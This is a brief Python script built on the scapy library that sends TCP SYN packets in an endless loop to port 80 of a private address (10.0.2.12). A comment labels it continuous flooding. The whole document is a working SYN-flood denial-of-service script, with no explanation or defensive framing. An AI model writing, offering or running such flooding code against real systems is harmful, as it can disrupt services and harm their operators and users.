from scapy.all import send, IP, TCP

target_ip = "10.0.2.12"
target_port = 80  # Common port
packet = IP(dst=target_ip)/TCP(dport=target_port, flags='S')

send(packet, loop=1, verbose=False)  # Loop for continuous flooding
